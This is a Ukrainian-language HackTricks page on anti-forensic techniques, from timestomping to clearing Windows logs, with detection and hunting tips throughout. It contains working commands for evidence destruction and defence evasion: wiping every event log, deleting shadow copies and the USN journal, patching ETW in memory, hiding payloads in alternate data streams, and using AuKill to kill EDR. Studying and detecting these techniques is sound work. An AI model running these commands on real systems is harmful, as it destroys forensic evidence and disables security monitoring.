# Антифорензичні техніки

{{#include ../../banners/hacktricks-training.md}}

## Часові мітки

Зловмисник може бути зацікавлений у **зміні часових міток файлів**, щоб уникнути виявлення.\
Часові мітки можна знайти всередині MFT в атрибутах `$STANDARD_INFORMATION` \_\_ і \_\_ `$FILE_NAME`.

Обидва атрибути мають 4 часові мітки: **модифікації**, **доступу**, **створення** та **модифікації запису MFT** (MACE або MACB).

**Windows explorer** та інші інструменти показують інформацію з **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Цей інструмент **змінює** інформацію про часові мітки всередині **`$STANDARD_INFORMATION`**, але **не** змінює інформацію всередині **`$FILE_NAME`**. Тому можна **виявити** **підозрілу** **активність**.

### Usnjrnl

**USN Journal** (журнал Update Sequence Number) — це функція NTFS (файлової системи Windows NT), яка відстежує зміни тому. Інструмент [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) дає змогу досліджувати ці зміни.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (журнал Update Sequence Number) — це функція NTFS (файлової системи Windows NT), яка відстежує зміни тому. Інструмент...](<../../images/image (801).png>)

На попередньому зображенні показано **вивід** **інструмента**, де можна побачити, що до файлу було внесено **певні зміни**.

### $LogFile

**Усі зміни метаданих файлової системи журналюються** в процесі, відомому як [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Журналюються метадані зберігаються у файлі `**$LogFile**`, розташованому в кореневому каталозі файлової системи NTFS. Для аналізу цього файлу та виявлення змін можна використовувати такі інструменти, як [LogFileParser](https://github.com/jschicht/LogFileParser).

![Usnjrnl - $LogFile: Усі зміни метаданих файлової системи журналюються в процесі, відомому як write-ahead logging. Журналюються метадані зберігаються у файлі $LogFile, розташованому в кореневому...](<../../images/image (137).png>)

Так само у виводі інструмента можна побачити, що **певні зміни було внесено**.

За допомогою того самого інструмента можна визначити, **коли саме було змінено часові мітки**:

![Usnjrnl - $LogFile: За допомогою того самого інструмента можна визначити, коли саме було змінено часові мітки](<../../images/image (1089).png>)

- CTIME: час створення файлу
- ATIME: час модифікації файлу
- MTIME: час модифікації запису MFT файлу
- RTIME: час доступу до файлу

### Порівняння `$STANDARD_INFORMATION` і `$FILE_NAME`

Ще один спосіб виявити підозрілі змінені файли — порівняти час в обох атрибутах у пошуках **невідповідностей**.

### Наносекунди

Часові мітки **NTFS** мають **точність** **100 наносекунд**. Тому пошук файлів із часовими мітками на кшталт 2010-10-10 10:10:**00.000:0000 є дуже підозрілим**.

### SetMace - Anti-forensic Tool

Цей інструмент може змінювати обидва атрибути `$STARNDAR_INFORMATION` і `$FILE_NAME`. Однак починаючи з Windows Vista для зміни цієї інформації потрібна запущена ОС.

## Приховування даних

NFTS використовує кластери та мінімальний розмір інформації. Це означає, що якщо файл займає один із половиною кластеру, **залишкова половина ніколи не буде використана** до видалення файлу. Отже, у цьому slack space можна **приховувати дані**.

Існують інструменти, як-от slacker, що дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз `$logfile` і `$usnjrnl` може показати, що певні дані було додано:

![SetMace - Anti-forensic Tool - Data Hiding: Існують інструменти, як-от slacker, що дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз $logfile і $usnjrnl може показати, що...](<../../images/image (1060).png>)

Після цього slack space можна отримати за допомогою таких інструментів, як FTK Imager. Зверніть увагу, що такий інструмент може зберігати вміст в обфускованому або навіть зашифрованому вигляді.

## UsbKill

Цей інструмент **вимикає комп’ютер, якщо в USB-портах виявлено будь-які зміни**.\
Щоб виявити його, можна перевірити запущені процеси та **переглянути кожен запущений python-скрипт**.

## Live Linux Distributions

Ці дистрибутиви **виконуються в оперативній пам’яті**. Єдиний спосіб їх виявити — **якщо файлову систему NTFS змонтовано з дозволами на запис**. Якщо її змонтовано лише з дозволами на читання, виявити вторгнення буде неможливо.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Конфігурація Windows

Можна вимкнути кілька методів журналювання Windows, щоб значно ускладнити forensic-розслідування.

### Вимкнення часових міток - UserAssist

Це ключ реєстру, який зберігає дати й час запуску кожного виконуваного файлу користувачем.

Вимкнення UserAssist потребує виконання двох кроків:

1. Встановіть два ключі реєстру — `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` і `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` — у значення zero, щоб вказати, що UserAssist потрібно вимкнути.
2. Очистьте піддерева реєстру, що мають вигляд `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Вимкнення часових міток - Prefetch

Ця функція зберігає інформацію про запущені застосунки з метою підвищення продуктивності системи Windows. Однак ця інформація також може бути корисною під час forensic-досліджень.

- Запустіть `regedit`
- Виберіть шлях до файлу `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Клацніть правою кнопкою миші `EnablePrefetcher` і `EnableSuperfetch`
- Для кожного з них виберіть Modify, щоб змінити значення з 1 (або 3) на 0
- Перезавантажте систему

### Вимкнення часових міток - Last Access Time

Щоразу, коли папку відкривають із тому NTFS на сервері Windows NT, система оновлює поле часової мітки в кожній папці зі списку, яке називається часом останнього доступу. На активно використовуваному томі NTFS це може впливати на продуктивність.

1. Відкрийте редактор реєстру (Regedit.exe).
2. Перейдіть до `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Знайдіть `NtfsDisableLastAccessUpdate`. Якщо його немає, додайте цей DWORD і встановіть його значення на 1, що вимкне цей процес.
4. Закрийте редактор реєстру та перезавантажте сервер.

### Видалення історії USB

Усі **записи USB-пристроїв** зберігаються в реєстрі Windows у ключі реєстру **USBSTOR**, який містить підрозділи, що створюються щоразу після підключення USB-пристрою до ПК або ноутбука. Цей ключ можна знайти тут: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Видаливши його**, ви видалите історію USB.\
Також можна скористатися інструментом [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), щоб переконатися, що записи видалено (і видалити їх).

Ще один файл, у якому зберігається інформація про USB-пристрої, — `setupapi.dev.log` у `C:\Windows\INF`. Його також слід видалити.

### Вимкнення Shadow Copies

**Виведіть список** shadow copies за допомогою `vssadmin list shadowstorage`\
**Видаліть** їх, виконавши `vssadmin delete shadow`

Також їх можна видалити через GUI, виконавши кроки, запропоновані на сторінці [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Щоб вимкнути shadow copies, виконайте [ці кроки](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Відкрийте програму Services, ввівши «services» у поле пошуку після натискання кнопки запуску Windows.
2. У списку знайдіть «Volume Shadow Copy», виберіть його, а потім відкрийте Properties, клацнувши правою кнопкою миші.
3. У розкривному меню «Startup type» виберіть Disabled, а потім підтвердьте зміну, натиснувши Apply і OK.

Також можна змінити конфігурацію файлів, які копіюватимуться до shadow copy, у реєстрі `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Перезапис видалених файлів

- Можна скористатися **інструментом Windows**: `cipher /w:C`. Ця команда змусить cipher видалити всі дані з доступного невикористаного дискового простору на диску C.
- Також можна використовувати такі інструменти, як [**Eraser**](https://eraser.heidi.ie)

### Видалення журналів подій Windows

- Windows + R --> eventvwr.msc --> розгорніть «Windows Logs» --> клацніть правою кнопкою миші кожну категорію та виберіть «Clear Log»
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Вимкнення журналів подій Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- У розділі services вимкніть службу «Windows Event Log»
- `WEvtUtil.exec clear-log` або `WEvtUtil.exe cl`

### Вимкнення $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Розширене журналювання та втручання в трасування (2023-2025)

### PowerShell ScriptBlock/Module Logging

Нові версії Windows 10/11 і Windows Server зберігають **розширені forensic-артефакти PowerShell** у
`Microsoft-Windows-PowerShell/Operational` (події 4104/4105/4106).
Зловмисники можуть вимкнути або стерти їх на льоту:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Захисники повинні відстежувати зміни цих ключів реєстру та масове видалення подій PowerShell.

### ETW (Event Tracing for Windows) Patch

Продукти безпеки кінцевих точок значною мірою покладаються на ETW. Популярний метод обходу захисту у 2024 році полягає в тому, щоб пропатчити `ntdll!EtwEventWrite`/`EtwEventWriteFull` у пам'яті, щоб кожен виклик ETW повертав `STATUS_SUCCESS`, не генеруючи подію:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (наприклад, `EtwTiSwallow`) реалізують той самий primitive у PowerShell або C++.
Оскільки patch є **process-local**, EDR, що працюють всередині інших процесів, можуть його пропустити.
Виявлення: порівняти `ntdll` у пам’яті з його версією на диску або встановити hook до переходу в user-mode.

### Відродження Alternate Data Streams (ADS)

У 2023 році було помічено, що malware campaigns (наприклад, loaders **FIN12**) розміщують binaries другого етапу всередині ADS, щоб залишатися непомітними для традиційних scanners:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Перелічуйте потоки за допомогою `dir /R`, `Get-Item -Stream *` або Sysinternals `streams64.exe`.
Копіювання host-файлу до FAT/exFAT або через SMB видалить прихований потік, що може бути використано
слідчими для відновлення payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver тепер регулярно використовується для **anti-forensics** під час атак
ransomware.
Інструмент з відкритим кодом **AuKill** завантажує підписаний, але вразливий драйвер (`procexp152.sys`), щоб
призупинити або завершити роботу EDR і forensic-сенсорів **до шифрування та знищення журналів**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Драйвер згодом видаляється, залишаючи мінімум артефактів.<sup>[[1]](#references)</sup>
Заходи протидії: увімкніть Microsoft vulnerable-driver blocklist (HVCI/SAC)
і налаштуйте сповіщення про створення kernel-service із user-writable paths.

---

## Linux Anti-Forensics: Self-Patching і Cloud C2 (2023–2025)

### Self‑patching скомпрометованих сервісів для зниження рівня виявлення (Linux)
Зловмисники дедалі частіше виконують “self‑patch” сервісу одразу після його експлуатації, щоб одночасно запобігти повторній експлуатації та придушити vulnerability-based detections. Ідея полягає в заміні вразливих компонентів найновішими легітимними upstream-бінарними файлами/JAR-файлами, щоб сканери визначали host як виправлений, тоді як persistence і C2 залишаються.<sup>[[3]](#references)</sup>

Приклад: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Після exploitation attackers завантажили легітимні JAR-файли з Maven Central (repo1.maven.org), видалили вразливі JAR-файли з інсталяції ActiveMQ та перезапустили broker.
- Це усунуло початковий RCE, водночас зберігши інші footholds (cron, зміни конфігурації SSH, окремі C2 implants).

Операційний приклад (ілюстративний)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Поради з forensic/hunting
- Перевірте каталоги сервісів на предмет незапланованих замін бінарних файлів/JAR:
- Debian/Ubuntu: `dpkg -V activemq` і порівняйте хеші/шляхи файлів із дзеркалами репозиторію.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Шукайте версії JAR, наявні на диску, але не належні package manager, або symbolic links, оновлені поза штатним процесом.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` для зіставлення ctime/mtime з періодом компрометації.
- Shell history/process telemetry: свідчення використання `curl`/`wget` для звернень до `repo1.maven.org` або інших artifact CDN одразу після початкової експлуатації.
- Change management: перевірте, хто і навіщо застосував “patch”, а не лише наявність patched version.

### C2 через cloud-сервіси з bearer tokens і anti-analysis stagers
Зафіксована тактика поєднувала кілька довготривалих шляхів C2 і anti-analysis пакування:<sup>[[3]](#references)</sup>
- Захищені паролем PyInstaller ELF loaders для ускладнення sandboxing і static analysis (наприклад, encrypted PYZ, тимчасове розпакування в `/_MEI*`).
- Indicators: результати `strings`, як-от `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: розпакування до `/tmp/_MEI*` або шляхів custom `--runtime-tmpdir`.
- C2 на базі Dropbox із hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` із `Authorization: Bearer <token>`.
- Шукайте в proxy/NetFlow/Zeek/Suricata вихідні HTTPS-з’єднання до доменів Dropbox із server workloads, які зазвичай не синхронізують файли.
- Паралельний/резервний C2 через tunneling (наприклад, Cloudflare Tunnel `cloudflared`), що зберігає контроль, якщо один канал заблоковано.
- Host IOCs: процеси/units `cloudflared`, конфігурація в `~/.cloudflared/*.json`, вихідні з’єднання через 443 до Cloudflare edges.

### Persistence і “hardening rollback” для збереження доступу (приклади Linux)
Attackers часто поєднують self-patching із durable access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron: зміни у stub `0anacron` у кожному каталозі `/etc/cron.*/` для періодичного виконання.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: увімкнення root logins і зміна default shells для low-privileged accounts.
- Шукайте enablement root login:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Шукайте підозрілі interactive shells у system accounts (наприклад, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Random, short-named beacon artifacts (8 alphabetical chars), записані на диск і такі, що також звертаються до cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders should correlate these artifacts with external exposure and service patching events to uncover anti-forensic self-remediation used to hide initial exploitation.

## References

- [1] [Sophos X-Ops – AuKill: weaponized vulnerable driver для вимкнення EDR (березень 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite для stealth: detection & hunting (червень 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching для persistence: як DripDropper Linux malware переміщується через cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
